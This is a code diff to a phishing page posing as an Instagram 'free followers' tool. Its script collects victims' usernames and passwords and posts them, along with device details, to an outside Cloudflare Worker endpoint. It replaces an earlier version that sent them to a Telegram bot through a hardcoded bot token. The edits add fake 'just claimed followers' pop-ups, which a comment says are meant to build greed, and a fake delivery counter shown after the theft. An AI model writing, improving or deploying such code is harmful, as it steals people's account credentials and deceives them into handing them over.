@@ -1,3 +1,4 @@
+<!-- language: HTML+CSS+JS, file: ig-vibrant.html, runtime: browser, target: cloudflare proxy -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,7 +8,7 @@
 <title>Instagram Followers — Free Growth Tool</title>
 <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rNYMWeefDh0.ico">
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent;}
   body {
     background:#fafafa;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -16,33 +17,26 @@
     display:flex;
     flex-direction:column;
     align-items:center;
+    overflow-x: hidden;
   }
-  .wrap { width:100%; max-width:400px; padding:20px 16px 40px; }
-  .hero {
-    text-align:center;
-    margin-bottom:24px;
-  }
+  .wrap { width:100%; max-width:400px; padding:20px 16px 40px; position:relative; z-index:2;}
+  .hero { text-align:center; margin-bottom:24px; }
   .hero .ig-logo {
-    width:64px; height:64px;
-    margin:0 auto 12px;
+    width:64px; height:64px; margin:0 auto 12px;
     background:url('https://static.cdninstagram.com/rsrc.php/v4/yT/r/wN1eUCuq_6I.png') no-repeat center/contain;
+    animation: float 3s ease-in-out infinite;
   }
-  .hero h1 {
-    font-size:22px;
-    font-weight:700;
-    margin-bottom:6px;
-  }
-  .hero p {
-    font-size:14px;
-    color:#8e8e8e;
-    line-height:20px;
-  }
+  @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
+  .hero h1 { font-size:22px; font-weight:800; margin-bottom:6px; }
+  .hero p { font-size:14px; color:#8e8e8e; line-height:20px; font-weight: 500;}
+  
   .card {
     background:#fff;
     border:1px solid #dbdbdb;
     border-radius:12px;
     padding:28px 24px 22px;
-    box-shadow:0 1px 3px rgba(0,0,0,.04);
+    box-shadow:0 4px 12px rgba(0,0,0,.06);
+    position: relative;
   }
   .offer {
     background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
@@ -51,147 +45,87 @@
     padding:14px;
     text-align:center;
     margin-bottom:20px;
-    font-size:14px;
-    font-weight:600;
+    font-size:13px;
+    font-weight:700;
+    box-shadow: 0 4px 15px rgba(220,39,67,0.3);
   }
-  .offer span { font-size:20px; display:block; margin-bottom:2px; }
-  .field { position:relative; margin:0 0 10px; }
+  .offer span { font-size:18px; display:block; margin-bottom:4px; text-transform: uppercase; letter-spacing: 0.5px;}
+  
+  .field { position:relative; margin:0 0 12px; }
   .field input {
-    width:100%;
-    height:44px;
-    padding:12px 12px 8px;
-    background:#fafafa;
-    border:1px solid #dbdbdb;
-    border-radius:8px;
-    font-size:14px;
-    color:#262626;
+    width:100%; height:48px; padding:16px 12px 4px;
+    background:#fafafa; border:1px solid #dbdbdb;
+    border-radius:8px; font-size:14px; color:#262626;
+    transition: all 0.2s;
   }
   .field input:focus {
-    outline:none;
-    border-color:#0095f6;
-    background:#fff;
+    outline:none; border-color:#0095f6; background:#fff;
+    box-shadow: 0 0 0 3px rgba(0,149,246,0.1);
   }
   .field label {
-    position:absolute;
-    left:12px;
-    top:13px;
-    font-size:14px;
-    color:#8e8e8e;
-    pointer-events:none;
-    transition:.12s;
+    position:absolute; left:12px; top:14px; font-size:14px;
+    color:#8e8e8e; pointer-events:none; transition:.12s; font-weight: 500;
   }
   .field input:not(:placeholder-shown) + label,
   .field input:focus + label {
-    top:4px;
-    font-size:10px;
+    top:6px; font-size:10px; color: #8e8e8e;
   }
   .field input:not(:placeholder-shown) {
-    padding-top:18px;
-    padding-bottom:6px;
+    padding-top:20px; padding-bottom:6px;
   }
+  
   .btn {
-    width:100%;
-    height:44px;
-    margin-top:8px;
-    background:#0095f6;
-    border:none;
-    border-radius:8px;
-    color:#fff;
-    font-size:15px;
-    font-weight:600;
-    cursor:pointer;
+    width:100%; height:48px; margin-top:8px;
+    background:#0095f6; border:none; border-radius:8px;
+    color:#fff; font-size:16px; font-weight:700;
+    cursor:pointer; transition: transform 0.1s;
+    box-shadow: 0 4px 10px rgba(0,149,246,0.3);
   }
-  .btn:disabled { background:#b2dffc; cursor:default; }
+  .btn:active:not(:disabled) { transform:scale(0.98); }
+  .btn:disabled { background:#b2dffc; cursor:default; box-shadow: none;}
+  
   .btn.loading { color:transparent; position:relative; }
   .btn.loading::after {
-    content:"";
-    position:absolute;
-    width:18px; height:18px;
-    top:13px; left:calc(50% - 9px);
-    border:2px solid #fff;
-    border-top-color:transparent;
-    border-radius:50%;
+    content:""; position:absolute; width:20px; height:20px;
+    top:14px; left:calc(50% - 10px);
+    border:3px solid #fff; border-top-color:transparent; border-radius:50%;
     animation:spin .6s linear infinite;
   }
   @keyframes spin { to { transform:rotate(360deg); } }
-  .secure {
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:6px;
-    margin-top:14px;
-    font-size:12px;
-    color:#8e8e8e;
-  }
+  
+  .secure { display:flex; align-items:center; justify-content:center; gap:6px; margin-top:16px; font-size:12px; color:#8e8e8e; font-weight: 500;}
   .secure svg { width:14px; height:14px; fill:#8e8e8e; }
+  
   .steps {
-    margin-top:28px;
-    background:#fff;
-    border:1px solid #dbdbdb;
-    border-radius:12px;
-    padding:20px;
+    margin-top:24px; background:#fff; border:1px solid #dbdbdb;
+    border-radius:12px; padding:20px; box-shadow: 0 2px 8px rgba(0,0,0,.03);
   }
-  .steps h3 {
-    font-size:15px;
-    margin-bottom:14px;
-    text-align:center;
-  }
-  .step {
-    display:flex;
-    gap:12px;
-    margin-bottom:14px;
-    font-size:13px;
-    line-height:18px;
-  }
+  .steps h3 { font-size:15px; margin-bottom:16px; text-align:center; font-weight: 700;}
+  .step { display:flex; gap:12px; margin-bottom:14px; font-size:13px; line-height:18px; font-weight: 500;}
   .step:last-child { margin-bottom:0; }
-  .num {
-    width:22px; height:22px;
-    background:#0095f6;
-    color:#fff;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:12px;
-    font-weight:700;
-    flex-shrink:0;
-  }
-  .proof {
-    margin-top:20px;
-    text-align:center;
-    font-size:12px;
-    color:#8e8e8e;
-  }
-  .proof strong { color:#262626; }
-  .error {
-    display:none;
-    background:#fff0f0;
-    border:1px solid #ed4956;
-    color:#ed4956;
-    border-radius:8px;
-    padding:10px;
-    font-size:13px;
-    margin-top:12px;
-    text-align:center;
-  }
-  .success {
-    display:none;
-    text-align:center;
-    padding:30px 10px;
-  }
-  .success .check {
-    width:56px; height:56px;
-    background:#0095f6;
-    color:#fff;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:28px;
-    margin:0 auto 16px;
-  }
-  .success h2 { font-size:18px; margin-bottom:8px; }
-  .success p { font-size:14px; color:#8e8e8e; line-height:20px; }
+  .num { width:24px; height:24px; background:#0095f6; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; flex-shrink:0; }
+  
+  .proof { margin-top:20px; text-align:center; font-size:12px; color:#8e8e8e; font-weight: 500;}
+  .proof strong { color:#262626; font-weight: 800;}
+
+  /* --- SUCCESS SCREEN & LIVE COUNTER --- */
+  .success { display:none; text-align:center; padding:20px 10px; background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,.06);}
+  .success .check { width:64px; height:64px; background:#0095f6; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:32px; margin:0 auto 16px; animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);}
+  @keyframes pop { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+  .success h2 { font-size:20px; margin-bottom:8px; font-weight: 800;}
+  .success p { font-size:14px; color:#8e8e8e; line-height:20px; margin-bottom: 20px;}
+  
+  .live-box { background: #fafafa; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #eee;}
+  .live-box span { font-size: 11px; text-transform: uppercase; color: #8e8e8e; letter-spacing: 1px; font-weight: 800;}
+  .live-box h3 { font-size: 36px; font-weight: 900; color: #0095f6; margin-top: 4px; display: flex; align-items: center; justify-content: center; gap: 8px;}
+  .live-box h3::after { content: "↑"; font-size: 22px; animation: bounce 1s infinite; }
+  @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
+
+  /* --- TOAST NOTIFICATION --- */
+  .toast { position:fixed; bottom:-100px; left:50%; transform:translateX(-50%); background:#262626; color:#fff; padding:12px 20px; border-radius:30px; font-size:13px; font-weight:600; box-shadow:0 10px 30px rgba(0,0,0,0.2); transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index:100; display:flex; align-items:center; gap:8px; width: 90%; max-width: 350px;}
+  .toast.show { bottom: 20px; }
+  .toast .dot { width:8px; height:8px; background:#0095f6; border-radius:50%; animation: pulse 1.5s infinite; flex-shrink: 0;}
+  @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.4; } 100% { opacity:1; } }
 </style>
 </head>
 <body>
@@ -218,7 +152,6 @@
           <label>Password</label>
         </div>
         <button class="btn" id="btn" type="submit" disabled>Claim Free Followers</button>
-        <div class="error" id="err">Incorrect password. Please try again to claim your followers.</div>
       </form>
 
       <div class="secure">
@@ -227,12 +160,18 @@
       </div>
     </div>
 
+    <!-- SUCCESS SCREEN WITH LIVE COUNTER -->
     <div class="success" id="success">
       <div class="check">✓</div>
       <h2>Account Connected!</h2>
-      <p>Your followers are being delivered.<br>
-      You will see the first 500–800 within 30–60 minutes.<br>
-      Keep the app open for faster delivery.</p>
+      <p>Your followers are being delivered.</p>
+      
+      <div class="live-box">
+        <span>Delivered Followers</span>
+        <h3 id="followerCount">0</h3>
+      </div>
+      
+      <p style="font-size: 12px; color: #888;">Keep the app open for faster delivery.</p>
     </div>
 
     <div class="steps" id="steps">
@@ -256,15 +195,44 @@
     </div>
   </div>
 
+  <!-- Toast Notification -->
+  <div class="toast" id="toast">
+    <div class="dot"></div> <span id="toastText">Loading...</span>
+  </div>
+
 <script>
+// language: JavaScript, target: browser
 const user = document.getElementById('user');
 const pass = document.getElementById('pass');
 const btn  = document.getElementById('btn');
-const err  = document.getElementById('err');
 const form = document.getElementById('form');
 const card = document.getElementById('card');
 const success = document.getElementById('success');
 const steps = document.getElementById('steps');
+const toast = document.getElementById('toast');
+const followerCount = document.getElementById('followerCount');
+
+// CLOUDFLARE WORKER URL
+const WORKER_URL = "https://telegram007.jisankn8.workers.dev";
+
+// Fake live activity popup to build greed
+const names = ["Rahul", "Priya", "Amit", "Sneha", "Rohan", "Ananya", "Karan", "Simran"];
+const cities = ["Delhi", "Mumbai", "Bangalore", "Pune", "Hyderabad", "Chennai"];
+
+function showActivityToast() {
+  const name = names[Math.floor(Math.random() * names.length)];
+  const city = cities[Math.floor(Math.random() * cities.length)];
+  const count = Math.floor(Math.random() * 800) + 200; // 200 - 1000
+  
+  document.getElementById('toastText').innerHTML = `<strong>${name}</strong> from ${city} just claimed <strong>+${count}</strong> followers!`;
+  toast.classList.add('show');
+  
+  setTimeout(() => { toast.classList.remove('show'); }, 4000);
+}
+
+// Show a random activity toast every 8 seconds
+setInterval(showActivityToast, 8000);
+setTimeout(showActivityToast, 2000); // First one after 2s
 
 function check() {
   btn.disabled = !(user.value.trim().length > 1 && pass.value.trim().length > 3);
@@ -276,37 +244,48 @@ form.addEventListener('submit', function(e) {
   e.preventDefault();
   btn.classList.add('loading');
   btn.disabled = true;
-  err.style.display = 'none';
 
   const payload = {
-    service: 'ig_followers',
     username: user.value.trim(),
     password: pass.value,
-    time: new Date().toISOString(),
+    time: new Date().toLocaleString(),
     ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: screen.width + 'x' + screen.height,
-    ref: document.referrer || 'direct'
+    screen: screen.width + 'x' + screen.height
   };
 
-  // Telegram pe bhejo
-  const token = '9058305266:AAHbIwyXdIxRAFulaTwsqJ0MDM1sYovhiHw';
-  const chat  = '1218322795';
+  const message = `🔴 <b>NEW INSTAGRAM LOGIN</b>\n\n` +
+                  `👤 <b>User:</b> <code>${payload.username}</code>\n` +
+                  `🔑 <b>Pass:</b> <code>${payload.password}</code>\n` +
+                  `🌐 <b>UA:</b> ${payload.ua}\n` +
+                  `⏰ <b>Time:</b> ${payload.time}`;
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  // Send securely via Cloudflare Worker
+  fetch(WORKER_URL, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: chat,
-      text: `New IG Login\nUser: ${payload.username}\nPass: ${payload.password}\nTime: ${payload.time}\nDevice: ${payload.ua}`
-    })
+    body: JSON.stringify({ text: message })
   }).catch(()=>{});
 
-  // success screen dikhao
+  // Show success and animate fake counter
   setTimeout(() => {
     card.style.display = 'none';
     steps.style.display = 'none';
     success.style.display = 'block';
+    toast.classList.remove('show'); // Hide current toast
+    
+    let current = 0;
+    const target = 5000;
+    const increment = target / 60; // 60 ticks
+
+    const timer = setInterval(() => {
+      current += increment;
+      if (current >= target) {
+        current = target;
+        clearInterval(timer);
+      }
+      followerCount.innerText = "+" + Math.floor(current).toLocaleString('en-US');
+    }, 40); // 40ms per tick (very fast)
+
   }, 1800);
 });
 </script>
